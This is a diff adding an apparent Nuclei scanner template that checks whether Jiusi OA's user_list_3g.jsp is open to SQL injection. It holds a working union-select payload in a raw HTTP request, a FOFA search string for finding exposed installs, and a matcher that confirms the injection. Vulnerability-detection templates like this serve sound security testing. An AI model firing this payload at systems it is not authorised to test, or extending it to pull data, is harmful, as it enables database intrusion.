@@ -1,0 +1,30 @@
+id: jsoa_user_list_3g_sqli
+ 
+info:
+  name: jsoa_user_list_3g_sqli
+  author: iiTzPatrick
+  severity: high
+  description: 九思OA软件user_list_3g.jsp存在SQL注入漏洞
+  metadata:
+    fofa-query: body="/jsoa/login.jsp"
+    verified: true
+    max-request: 1
+  tags: OA,sqli,others
+
+variables:
+  payload: '{{rand_int(1, 100)}}'
+
+http:
+  - raw:
+      - |
+        GET /jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5({{payload}})%20%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate, br
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"{{md5({{payload}})}}")
+# digest: 4b0a00483046022100ef474c2d57fb7486d6facd587814ece920c3bd26a096ec23e98c0c1a5ea2d357022100862ab5108417b70bb3e7056c17c1e7808d6c0703356a59822b1675d06ed04556:6b2dd5af372f02ed15a56faf8ad98cf9
